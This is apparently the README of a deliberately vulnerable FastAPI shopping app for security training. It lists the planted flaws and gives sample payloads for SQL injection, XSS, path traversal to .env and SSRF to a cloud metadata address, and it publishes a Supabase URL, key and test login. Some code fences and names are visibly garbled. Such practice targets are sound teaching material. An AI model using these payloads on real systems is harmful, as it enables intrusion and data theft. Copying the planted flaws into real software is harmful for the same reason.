# Vulnerable Shopping Application

⚠️ **WARNING: This application contains deliberate security vulnerabilities!**
⚠️ **DO NOT deploy to production!**
⚠️ **For educational purposes only!**

## Quick Start

### 1. Install Dependencies
\\\ash
pip install -r requirements.txt
\\\

### 2. Run the Application
\\\ash
python main.py
\\\

### 3. Access the Application
- **Home**: http://localhost:5000
- **Admin**: http://localhost:5000/admin
- **Login**: http://localhost:5000/login
- **Debug**: http://localhost:5000/debug

## Test Credentials
- **Username**: dmin
- **Password**: dmin123

## Supabase Configuration
- **URL**: https://qxwmvjiivihdbezlfxrr.supabase.co
- **Key**: sb_publishable_ekjpnoI1BZbs975dK3SXEQ_FAaaHJ6E

## Vulnerabilities Included

### 1. SQL Injection
- Login: dmin' OR '1'='1' --
- Search: ' OR '1'='1
- Admin panel operations

### 2. Cross-Site Scripting (XSS)
- Reflected XSS in search
- Stored XSS in reviews
- DOM-based XSS

### 3. Authentication Issues
- No authentication on admin panel
- No CSRF protection
- Session fixation vulnerability

### 4. Data Exposure
- Plaintext passwords in database
- Credit card numbers stored
- CVV codes stored
- Debug endpoint exposes all data

### 5. Server-Side Vulnerabilities
- SSRF via /proxy endpoint
- Command injection
- Path traversal
- Unrestricted file upload

## Project Structure
\\\
vulnerable-shop/
├── main.py              # FastAPI application
├── requirements.txt     # Python dependencies
├── .env                # Environment variables
├── render.yaml         # Render deployment config
├── templates/          # HTML templates
│   ├── base.html
│   ├── index.html
│   ├── product.html
│   ├── cart.html
│   ├── checkout.html
│   ├── admin.html
│   ├── login.html
│   └── orders.html
└── static/             # Static files
    └── uploads/        # File uploads
\\\

## Deployment Options

### Render
1. Push code to GitHub
2. Connect to Render
3. Use render.yaml for configuration

### Local
\\\ash
pip install -r requirements.txt
python main.py
\\\

## Security Testing Examples

### SQL Injection
\\\sql
-- Login bypass
admin' OR '1'='1' --

-- Data extraction
admin' UNION SELECT * FROM users --
\\\

### XSS Payloads
\\\html
<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- Stored XSS -->
<img src=x onerror=alert(1)>

<!-- DOM XSS -->
<svg onload=alert(1)>
\\\

### Path Traversal
\\\
/admin?file=../../main.py
/admin?file=../../.env
\\\

### SSRF
\\\
/proxy?url=http://localhost:5000/debug
/proxy?url=http://169.254.169.254/latest/meta-data/
\\\

## License
Educational Purposes Only
